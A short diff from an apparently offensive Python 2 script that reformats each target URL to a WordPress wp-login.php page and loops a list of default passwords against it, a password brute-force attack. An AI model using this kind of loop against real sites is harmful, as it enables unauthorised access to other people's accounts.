@@ -108,6 +108,7 @@ def main():
 		elif wpb == "start":
 			if len(sites) != 0:
 				for site in sites:
+					site = "http://" + site.split("/")[2] + "/wp-login.php" # re formatting url for test :)
 					print "[-] Trying: ", site
 					for pwd in default_pwds:
 						bruteForce.brute(site, pwd)
